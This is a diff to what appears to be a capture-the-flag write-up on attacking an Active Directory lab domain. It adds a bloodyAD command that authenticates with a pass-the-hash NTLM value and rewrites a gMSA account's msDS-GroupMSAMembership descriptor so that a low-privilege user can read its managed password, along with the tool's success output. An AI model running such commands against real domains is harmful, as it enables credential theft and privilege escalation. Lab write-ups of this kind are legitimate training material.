@@ -621,8 +621,15 @@ bloodyAD --host dc01.casper.hsm -d casper.hsm -u jay -p ':9b88ec231f4f0e5cb7d9ed
 distinguishedName: CN=jay,CN=Users,DC=casper,DC=hsm
 objectSid: S-1-5-21-247086266-1178499391-1139383971-1106
 
-
+bloodyAD --host DC01.casper.hsm -d casper.hsm -u jay -p ':9b88ec231f4f0e5cb7d9edef1f399f6c' set object 'casper-gmsa$' msDS-GroupMSAMembership -v 'O:S-1-5-32-544D:(A;;RP;;;S-1-5-21-247086266-1178499391-1139383971-1106)'
+[+] casper-gmsa$'s msDS-GroupMSAMembership has been updated
 ```
 
 After some research about the value i need to append i updated it using bloodyAD
+
+After first getting the SID of the object `jay` i can use that to write the value to the property, now i should be able to read it
+
+```python
+
+```
 
